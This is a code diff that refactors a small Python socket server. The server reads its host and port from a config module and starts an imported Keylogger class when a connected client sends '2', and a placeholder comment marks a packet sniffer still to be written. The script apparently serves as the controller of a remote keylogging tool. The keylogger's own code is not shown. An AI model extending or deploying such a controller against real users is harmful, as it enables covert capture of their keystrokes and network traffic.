@@ -1,16 +1,13 @@
 import socket
+import config
 from Keylogger.server import Keylogger
-
-# Server configuration local
-HOST = 'localhost'
-PORT = 12346
 
 # Create a socket server
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow address reuse
-server_socket.bind((HOST, PORT))
+server_socket.bind((config.SERVER_HOST, config.SERVER_PORT))
 server_socket.listen(1)
-print(f"Server is listening on {HOST}:{PORT}")
+print(f"Server is listening on {config.SERVER_HOST}:{config.SERVER_PORT}")
 
 try:
     while True:
@@ -22,6 +19,7 @@ try:
             while True:
                 # Perform communication with the client
                 data = client_socket.recv(1024)
+
                 if not data:
                     break  # Exit the loop when the client disconnects
 
@@ -32,16 +30,15 @@ try:
                     # do packet sniffer code here.
 
                 if data == '2':
-                    print("starting keylogger")
                     try:
                         keylogger = Keylogger(client_socket)
                         keylogger.start()
-                    except (ConnectionResetError, BrokenPipeError):
-                        print("Client disconnected.")
+                    except (ConnectionResetError, BrokenPipeError) as e:
+                        print(f"Problem starting keylogger: {e}")
                         break
 
         except KeyboardInterrupt:
-            print("Server is stopping")
+            pass
         finally:
             if client_socket:
                 try:
@@ -51,6 +48,6 @@ try:
                     print("Client disconnected abruptly.")
 
 except KeyboardInterrupt:
-    print("Server is stopping finally")
+    print("Server is stopping.")
 finally:
     server_socket.close()
